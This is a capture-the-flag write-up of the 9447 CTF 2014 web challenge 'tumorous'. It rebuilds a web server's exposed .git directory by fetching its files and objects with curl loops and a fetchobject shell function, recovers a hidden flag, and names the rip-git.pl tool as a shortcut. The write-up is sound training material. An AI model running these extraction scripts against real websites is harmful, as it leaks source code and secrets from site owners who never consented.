# 9447 CTF 2014: tumorous

**Category:** Web
**Points:** 100
**Solves:** 224
**Description:**

> They are following me. They are after my token. I have to hide it somewhere. I’m not very good at hiding.
>
> [tumorous.9447.plumbing](http://tumorous.9447.plumbing/)

## Write-up

**Note:** This challenge is a harder version of [the _bashful_ challenge](https://github.com/ctfs/write-ups/tree/master/9447-ctf-2014/bashful#readme).

The page at <http://tumorous.9447.plumbing/> contains:

> 13/2/2004: I learned how to html, yay!
> 12/4/2004: I learned how to use git, yay!
> 13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.
> 08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.
> 10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.
> 10/9/2004: I can't forget my token. What do I do?
> 11/9/2004: I panicked and deleted the token. It is the work of evil doers.
> 12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.

The second line hints at Git, so let’s try visiting <http://tumorous.9447.plumbing/.git/>. It returns a 403 Forbidden status code, indicating that the `.git` directory exists on the server, although directory listings are disabled.

An easy way to figure out which files are usually present in a `.git` folder is to create a new Git repository.

```bash
$ cd $(mktemp -d /tmp/tumorous-XXXX)

$ git init

$ cd .git

$ ls -Rls
total 24
8 -rw-r--r--   1 mathias  wheel   23 Nov 30 15:24 HEAD
8 -rwxr--r--   1 mathias  wheel  137 Nov 30 15:24 config
8 -rw-r--r--   1 mathias  wheel   73 Nov 30 15:24 description
0 drwxr-xr-x  11 mathias  wheel  374 Nov 30 15:24 hooks
0 drwxr-xr-x   3 mathias  wheel  102 Nov 30 15:24 info
0 drwxr-xr-x   4 mathias  wheel  136 Nov 30 15:24 objects
0 drwxr-xr-x   4 mathias  wheel  136 Nov 30 15:24 refs

./hooks:
total 80
 8 -rwxr-xr-x  1 mathias  wheel   452 Nov 30 15:24 applypatch-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel   896 Nov 30 15:24 commit-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel   189 Nov 30 15:24 post-update.sample
 8 -rwxr-xr-x  1 mathias  wheel   398 Nov 30 15:24 pre-applypatch.sample
 8 -rwxr-xr-x  1 mathias  wheel  1642 Nov 30 15:24 pre-commit.sample
 8 -rwxr-xr-x  1 mathias  wheel  1352 Nov 30 15:24 pre-push.sample
16 -rwxr-xr-x  1 mathias  wheel  4951 Nov 30 15:24 pre-rebase.sample
 8 -rwxr-xr-x  1 mathias  wheel  1239 Nov 30 15:24 prepare-commit-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel  3611 Nov 30 15:24 update.sample

./info:
total 8
8 -rw-r--r--  1 mathias  wheel  240 Nov 30 15:24 exclude

./objects:
total 0
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 info
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 pack

./objects/info:

./objects/pack:

./refs:
total 0
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 heads
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 tags

./refs/heads:

./refs/tags:

```

Now we have a list of files and folders we can look for on the server: `http://tumorous.9447.plumbing/.git/HEAD`, `http://tumorous.9447.plumbing/.git/config`, etc. Let’s recreate the expected directory structure locally, and download these files:

```bash
mkdir -p /tmp/restored-git-repo/.git;
cd /tmp/restored-git-repo/.git;
mkdir -p {hooks,info,objects/{info,pack},refs/{heads,tags}};
for file in HEAD config description info/exclude refs/heads/master; do
  curl "http://tumorous.9447.plumbing/.git/${file}" > "${file}";
done;
cd ..;
```

Whenever we run a Git command in the repository, we get an error:

```bash
$ git log
fatal: bad object HEAD
```

Let’s see what `HEAD` refers to:

```bash
$ cat .git/HEAD
ref: refs/heads/master

$ cat .git/refs/heads/master
3dbda5576912236328494b11f9361dca66c0218a
```

Due to [the way Git stores objects](http://git-scm.com/book/en/v2/Git-Internals-Git-Objects), the object `3dbda5576912236328494b11f9361dca66c0218a` is expected to be at `.git/objects/3d/bda5576912236328494b11f9361dca66c0218a`. Let’s write a function to download such objects based on their hash:

```bash
function fetchobject() {
  hash="${1}";
  dir="${hash:0:2}";
  file="${hash:2:38}";
  mkdir -p ".git/objects/${dir}";
  path=".git/objects/${dir}/${file}";
  curl -s "http://tumorous.9447.plumbing/${path}" > "${path}";
}
```

Now we can easily download the first missing piece, i.e. object `3dbda5576912236328494b11f9361dca66c0218a`:

```bash
$ fetchobject 3dbda5576912236328494b11f9361dca66c0218a
```

Now, let’s try running `git log` again:

```bash
$ git log
error: Could not read 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a
fatal: Failed to traverse parents of commit 3dbda5576912236328494b11f9361dca66c0218a
```

Another missing object! Let’s download it and try again:

```bash
$ fetchobject 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a

$ git log
commit 3dbda5576912236328494b11f9361dca66c0218a
Author: root <root@ip-172-31-5-48.ap-southeast-2.compute.internal>
Date:   Sat Nov 29 03:21:33 2014 +0000

    My token now exists!

commit 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a
Author: John Doe <fsck@you.me>
Date:   Tue Oct 7 08:32:28 2014 +0000

    I'm new to this repo stuff
```

Yay! We can now view the commit log. Effectively this is now a _bare_ Git repository: it contains the repository data but not the actual files. Let’s restore those as well:

```bash
$ git config --local --bool core.bare false

$ git checkout -f
error: unable to read sha1 file of token (0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0)

$ fetchobject 0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0

$ git checkout -f
error: unable to read sha1 file of index.html (3bba60ef48578d0619aff067c7f6596c1426ce96)

$ fetchobject 3bba60ef48578d0619aff067c7f6596c1426ce96

$ git checkout -f

$ ls
index.html token

$ cat token
9447{IM_SITTING_ON_A_PILE_OF_GOLD}
```

The flag is `9447{IM_SITTING_ON_A_PILE_OF_GOLD}`.

### Alternate solution

This challenge is trivial to solve using [rip-git](https://github.com/kost/dvcs-ripper/blob/master/rip-git.pl):

```bash
$ perl ./rip-git.pl -v -u http://tumorous.9447.plumbing/.git/

$ cat token
9447{IM_SITTING_ON_A_PILE_OF_GOLD}
```

## Other write-ups and resources

* [Write-up by Hypnosec](https://github.com/hypnosec/writeups/blob/master/2014/9447-ctf/web/tumorous.md)
* <http://wiremask.eu/9447-ctf-2014-web-100-tumorous/>
